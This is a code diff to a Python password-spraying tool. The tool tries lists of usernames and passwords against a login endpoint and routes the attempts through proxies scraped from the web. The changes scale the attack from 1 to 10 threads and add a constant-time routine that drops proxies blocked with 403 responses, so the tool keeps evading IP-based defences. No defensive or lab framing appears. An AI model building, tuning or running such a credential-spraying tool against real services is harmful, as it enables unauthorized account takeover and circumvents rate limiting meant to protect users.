@@ -21,6 +21,11 @@ headers = {
     'Content-Type': 'application/json'
 }
 
+# Map proxies to index
+proxiesToIndex = {}
+# Proxies List
+proxies_list = []
+
 # Function to read the usernames from a file
 def read_usernames(file_path):
     with open(file_path, 'r') as file:
@@ -93,16 +98,31 @@ def create_proxy(crawl_from_web=True):
 def get_random_proxy():
     return random.choice(proxies_list)
 
-# Example usage:
-# proxies_list = create_proxy(crawl_from_web=True)  # Set to False to load from file
-# print("List of Proxy")
-# print(proxies_list)
-# print("Fetch Proxy List Success!")
+# Function to delete the proxy list in constant time while
+# we still can access random element in constant time
+def delete_proxy_in_constant_time(proxy):
+    if proxy not in proxiesToIndex:
+        return
+    try:
+        proxyIndex = proxiesToIndex[proxy]
+        proxiesToIndex[proxies_list[-1]['http']] = proxyIndex
+        # Swap the deleted one to the last one
+        proxies_list[proxyIndex], proxies_list[-1] = proxies_list[-1], proxies_list[proxyIndex]
+        # Delete the last one
+        proxies_list.pop()
+        del proxiesToIndex[proxy]
+    except KeyError as e:
+        print(f"KeyError: {e} - This proxy may not exist in the mapping.")
+    except IndexError as e:
+        print(f"IndexError: {e} - The proxies list might be empty.")
+    except Exception as e:
+        print(f"An unexpected error occurred: {e}")
+
 max_retries = 3
 proxies_lock = threading.Lock()
 
 def rotating_proxy(username, password):
-    # global proxies_list
+    global proxies_list
     retry_count = 0
 
     while retry_count < max_retries:
@@ -111,7 +131,7 @@ def rotating_proxy(username, password):
             # print("hi")
             # print(proxies_list)
             proxies = get_random_proxy()
-            print(proxies)
+            # print(proxies)
 
             # Attempt to log in with the specified proxy and credentials
             login_response = session.post(
@@ -131,30 +151,32 @@ def rotating_proxy(username, password):
                 print(f"[-] Proxy blocked (403 Forbidden) for {username}:{password} using proxy {proxies["http"]}")
                 # Remove the blocked proxy
                 with proxies_lock:
-                    proxies_list.remove(proxies)
+                    # proxies_list.remove(proxies)
+                    delete_proxy_in_constant_time(proxies["http"])
                 retry_count += 1  # Increment retry count after a 403
             else:
                 print(f"[-] Other failure for {username}:{password} (Status Code: {login_response.status_code}) using proxy {proxies["http"]}")
                 retry_count += 1
 
         except requests.RequestException as e:
-            print(f"Error with proxy {proxies["http"]} - Username: {username} and Password:{password} - {e}")
+            print(f"[-] Error with proxy {proxies["http"]} - Username: {username} and Password:{password} - {e}")
             retry_count += 1  # Increment retry count on request error
         except Exception as e:
             # Handle any other exceptions that may occur
-            print(f"An unexpected error occurred - Username: {username} and Password: {password} - {e}")
+            print(f"[-] An unexpected error occurred - Username: {username} and Password: {password} - {e}")
             retry_count += 1  # Increment retry count on request error
 
         # Sleep or add a delay if needed
         # time.sleep(1)  # Optional, to avoid immediate re-requests
+        # print(len(proxies_list))
 
     print(f"Max retries reached for {username}:{password}")
 
 
-# Function to perform password spraying
+# Function to perform password spraying using multithreading
 def password_spray(usernames, passwords):
     # Using ThreadPoolExecutor to manage a pool of threads
-    with ThreadPoolExecutor(max_workers=1) as executor:
+    with ThreadPoolExecutor(max_workers=10) as executor:
         # Iterate through each username and try each password
         for username in usernames:
             for password in passwords:
@@ -182,13 +204,16 @@ if __name__ == "__main__":
 
     # Example usage:
     proxies_list = create_proxy(crawl_from_web=True)  # Set to False to load from file
-    print("List of Proxy")
-    print(proxies_list)
-    print("Fetch Proxy List Success!")
+    # print("List of Proxy")
+    # print(proxies_list)
+    print("Fetch Proxy List Success!...")
+
+    # Create map to index to delete + print random element in constant time
+    proxiesToIndex = {proxy["http"]: index for index, proxy in enumerate(proxies_list)}
 
     # Run the password spray
     password_spray(usernames, passwords)
-
+    time.sleep(2)
     print(len(proxies_list))
 
     
